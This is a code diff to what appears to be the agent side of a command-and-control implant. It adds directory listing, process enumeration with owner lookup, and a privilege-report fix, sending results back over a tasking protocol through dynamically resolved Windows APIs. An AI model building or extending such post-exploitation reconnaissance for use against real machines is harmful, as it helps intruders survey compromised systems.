@@ -127,7 +127,7 @@ void commanders::do_getprivs() {
 	}
 
 	g_ByteMgr->Write4(STATUS_OK);
-	g_ByteMgr->Write4(TASK_TYPE_LS);
+	g_ByteMgr->Write4(TASK_TYPE_GETPRIVS);
 	g_ByteMgr->Write4(TokenPrivs->PrivilegeCount);
 	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
 		LUID_AND_ATTRIBUTES Priv = TokenPrivs->Privileges[i];
@@ -212,92 +212,66 @@ CLEANUP:
 
 
 void commanders::do_ls() {
-	return;
-}
+	WIN32_FIND_DATAA FindData;
+	HANDLE hFind = NULL;
+	
+	DWORD typeLen;
+	DWORD BufSize   = 12 * 1024;
+	DWORD TotalSize = 0;
+	DWORD Namelen   = 0;
+	DWORD EntryLen  = 0;
+	DWORD PathSize  = 0;
 
-//	WIN32_FIND_DATAA FindData;
-//	HANDLE hFind = NULL;
-//	
-//	DWORD typeLen;
-//	DWORD BufSize   = 12 * 1024;
-//	DWORD TotalSize = 0;
-//	DWORD Namelen   = 0;
-//	DWORD EntryLen  = 0;
-//	DWORD PathSize  = 0;
-//
-//	char path[MAX_PATH];
-//	const char* type;
-//	g_ByteMgr->BeginTask();
-//
-//	UINT len = g_ByteMgr->Read4();
-//	PCHAR Dir = g_ByteMgr->ReadString(len);
-//	PBYTE buf = AllocMemory<BYTE>(BufSize);
-//	if (!buf) {
-//		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
-//		goto CLEANUP;
-//	}
-//
-//	
-//	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
-//	path[PathSize] = '\\';
-//	path[++PathSize] = '*';
-//	path[++PathSize] = '\0';
-//
-//	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
-//	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
-//		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
-//		goto CLEANUP;
-//	}
-//
-//	do {
-//		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
-//			continue;
-//		}
-//		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-//			type = "DIR"; typeLen = 3;
-//		}
-//		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
-//			type = "LINK", typeLen = 4;
-//		}
-//		else {
-//			type = "FILE"; typeLen = 4;
-//		}
-//
-//		
-//		DWORD padding = 1;
-//		Namelen = (DWORD)strlen(FindData.cFileName);
-//		if (Namelen < COL_WIDTH) padding = COL_WIDTH - Namelen;
-//
-//		
-//
-//		if (TotalSize + EntryLen + 1 > BufSize) {
-//			DWORD NewCap = BufSize * 2;
-//			while (NewCap < TotalSize + EntryLen + 1) NewCap *= 2;
-//			PBYTE newBuf = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, NewCap);
-//			buf = newBuf;
-//			BufSize = NewCap;
-//		}
-//		DWORD pos = TotalSize;
-//		memcpy(buf + pos, FindData.cFileName, Namelen);
-//		pos += Namelen;
-//		memset(buf + pos, ' ', padding);
-//		pos += padding;
-//		memcpy(buf + pos, type, typeLen);
-//		pos += Namelen;
-//
-//		buf[pos++] = '\n';
-//		TotalSize = pos;
-//
-//	} while (hades->WinApis.FindNextFileA(hFind, &FindData));
-//
-//	if (TotalSize > 0) { buf[TotalSize + EntryLen] = '\0'; }
-//	g_ByteMgr->EndOkData(buf, TotalSize);
-//
-//CLEANUP:
-//	if (Dir) { g_ByteMgr->FreeString(Dir); }
-//	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
-//
-//}
+	char path[MAX_PATH];
+	const char* type;
+	g_ByteMgr->BeginTask();
+
+	UINT len = g_ByteMgr->Read4();
+	PCHAR Dir = g_ByteMgr->ReadString(len);
+	
+	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
+	path[PathSize] = '\\';
+	path[++PathSize] = '*';
+	path[++PathSize] = '\0';
+
+	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
+	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+
+
+	g_ByteMgr->Write4(STATUS_OK);
+	g_ByteMgr->Write4(TASK_TYPE_LS);
+	do {
+		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
+			continue;
+		}
+		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+			type = "DIR"; typeLen = 3;
+		}
+		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+			type = "LINK", typeLen = 4;
+		}
+		else {
+			type = "FILE"; typeLen = 4;
+		}
+
+		UINT len = (UINT)strlen(FindData.cFileName);
+		g_ByteMgr->Write4(len);
+		g_ByteMgr->WriteString((PBYTE)FindData.cFileName, len);
+		g_ByteMgr->Write4(typeLen);
+		g_ByteMgr->WriteString((PBYTE)type, typeLen);
+		
+
+	} while (hades->WinApis.FindNextFileA(hFind, &FindData));
+
+	g_ByteMgr->Write4(END_SIG);
+
+CLEANUP:
+	if (Dir) { g_ByteMgr->FreeString(Dir); }
+
+}
 
 void commanders::do_cp() {
 	g_ByteMgr->BeginTask();
@@ -441,86 +415,104 @@ CLEANUP:
 
 //
 void commanders::do_ps() {
-	return;
+	NTSTATUS stat;
+	ULONG size = 0;
+	PSYSTEM_PROCESS_INFORMATION spi = NULL;
+	CLIENT_ID cid = { 0 };
+	OBJECT_ATTRIBUTES oa;
+	HANDLE hProc = NULL;
+	HANDLE hToken = NULL;
+
+	PBYTE buf    = NULL;
+	PBYTE OutBuf = NULL;
+
+	DWORD capacity = BASE_BUFFER_SIZE;
+	DWORD needed = 0;
+	DWORD PID = 0;
+	INT pidlen = 0;
+	INT len = 0;
+
+	const char* owner = "N/A";
+	DWORD ownerLen = 3;
+
+	g_ByteMgr->BeginTask();
+
+	hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
+	buf = AllocMemory<BYTE>(size);
+
+	if (!buf) {
+		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+		goto CLEANUP;
+	}
+	
+	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
+	if (!NTAPI_SUCCESS(stat)) {
+		g_ByteMgr->EndErr(ERROR_PS_LIST);
+		goto CLEANUP;
+	}
+
+	spi = (PSYSTEM_PROCESS_INFORMATION)buf;
+
+
+	g_ByteMgr->Write4(STATUS_OK);
+	g_ByteMgr->Write4(TASK_PS_LIST);
+	while (TRUE) {
+		CHAR line[512] = { 0 };
+		DWORD pos = 0;
+		if (!spi->ImageName.Buffer) {
+			goto NEXT_ENTRY;
+		} 
+		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
+		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
+
+		cid.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
+		cid.UniqueThread = 0;
+
+		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
+		stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
+		if (NTAPI_SUCCESS(stat)) {
+			stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_QUERY, &hToken);
+
+			if (NTAPI_SUCCESS(stat)) {
+				hades->WinApis.GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
+				PTOKEN_USER tokenUsr = AllocMemory<TOKEN_USER>(needed);
+
+				if (hades->WinApis.GetTokenInformation(hToken, TokenUser, tokenUsr, needed, &needed)) {
+					CHAR NameBuf[256];
+					CHAR DomainBuf[256];
+					DWORD NameLen = 256;
+					DWORD DomainLen = 256;
+
+					SID_NAME_USE sidType;
+					if (hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
+						owner = NameBuf;
+						ownerLen = NameLen;
+						
+					}
+				}
+				HeapFree(GetProcessHeap(), 0, tokenUsr);
+				hades->WinApis.CloseHandle(hToken);
+			}
+			hades->WinApis.CloseHandle(hProc);
+		}
+		g_ByteMgr->Write4(len);
+		g_ByteMgr->WriteString((PBYTE)line, len);
+		g_ByteMgr->Write4(ownerLen);
+		g_ByteMgr->WriteString((PBYTE)owner, ownerLen);
+		g_ByteMgr->Write4(PID);
+		
+
+	NEXT_ENTRY:
+		if (spi->NextEntryOffset == NULL) break;
+		spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
+	}
+	g_ByteMgr->Write4(END_SIG);
+
+CLEANUP:
+	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
+
+
 }
-//	NTSTATUS stat;
-//	ULONG size = 0;
-//	PSYSTEM_PROCESS_INFORMATION spi = NULL;
-//
-//	PBYTE buf    = NULL;
-//	PBYTE OutBuf = NULL;
-//
-//	DWORD capacity = BASE_BUFFER_SIZE;
-//	DWORD used = 0;
-//	DWORD PID = 0;
-//	INT pidlen = 0;
-//	INT len = 0;
-//
-//	g_ByteMgr->BeginTask();
-//
-//	hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
-//	buf = AllocMemory<BYTE>(size);
-//	OutBuf = AllocMemory<BYTE>(capacity);
-//
-//	if (!buf || !OutBuf) {
-//		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
-//		goto CLEANUP;
-//	}
-//	
-//	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
-//	if (NTAPI_SUCCESS(stat)) {
-//		g_ByteMgr->EndErr(ERROR_PS_LIST);
-//		goto CLEANUP;
-//	}
-//
-//	spi = (PSYSTEM_PROCESS_INFORMATION)buf;
-//
-//	while (TRUE) {
-//		CHAR line[512] = { 0 };
-//		DWORD pos = 0;
-//		if (!spi->ImageName.Buffer) {
-//			goto NEXT_ENTRY;
-//		} 
-//		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
-//		if (len <= 0) {
-//			goto NEXT_ENTRY;
-//		}
-//		pos += len;
-//
-//		line[pos++] = ' ';
-//		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
-//		CHAR pidStr[16];
-//		pidlen = IntToStr(PID, pidStr);
-//		memcpy(line + pos, pidStr, pidlen);
-//		pos += pidlen;
-//		line[pos++] = '\n';
-//		if (used + pos + 1 > capacity) {
-//			DWORD newCap = capacity * 2;
-//			while (newCap < used + pos + 1) newCap *= 2;
-//			PBYTE newBuf = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, OutBuf, newCap);
-//			if (!newBuf) {
-//				g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
-//				goto CLEANUP;
-//			}
-//			OutBuf = newBuf;
-//			capacity = newCap;
-//		}
-//		memcpy(OutBuf + used, line, pos);
-//		used += pos;
-//		OutBuf[used] = '\0';
-//	NEXT_ENTRY:
-//		if (spi->NextEntryOffset == NULL) break;
-//		spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
-//		
-//
-//	}
-//	g_ByteMgr->EndOkData(OutBuf, used);
-//CLEANUP:
-//	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
-//	if (OutBuf) { HeapFree(GetProcessHeap(), 0, OutBuf); }
-//
-//
-//}
 
 
 
